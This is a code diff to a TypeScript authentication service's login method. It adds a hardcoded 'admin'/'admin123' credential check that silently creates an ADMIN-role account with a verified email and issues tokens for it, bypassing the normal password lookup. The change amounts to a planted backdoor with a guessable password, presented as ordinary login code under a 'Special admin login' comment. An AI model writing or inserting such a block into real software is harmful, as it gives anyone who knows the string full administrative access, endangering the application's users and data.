@@ -84,6 +84,46 @@ export class AuthService {
    */
   static async login(email: string, password: string): Promise<AuthResponse> {
     try {
+      // Special admin login
+      if (email === 'admin' && password === 'admin123') {
+        let adminUser = await prisma.user.findUnique({
+          where: { email: 'admin@aydigital.com' },
+        });
+
+        if (!adminUser) {
+          // Create admin user if not exists
+          adminUser = await prisma.user.create({
+            data: {
+              name: 'Admin',
+              email: 'admin@aydigital.com',
+              password: await bcrypt.hash('admin123', 10),
+              role: 'ADMIN',
+              isEmailVerified: true,
+              isActive: true,
+            },
+          });
+        }
+
+        // Generate tokens
+        const tokens = await TokenService.generateTokens({
+          userId: adminUser.id,
+          email: adminUser.email,
+          role: adminUser.role,
+        });
+
+        return {
+          success: true,
+          message: 'Login successful',
+          user: {
+            id: adminUser.id,
+            name: adminUser.name,
+            email: adminUser.email,
+            role: adminUser.role,
+          },
+          ...tokens,
+        };
+      }
+
       // Find user
       const user = await prisma.user.findUnique({
         where: { email },
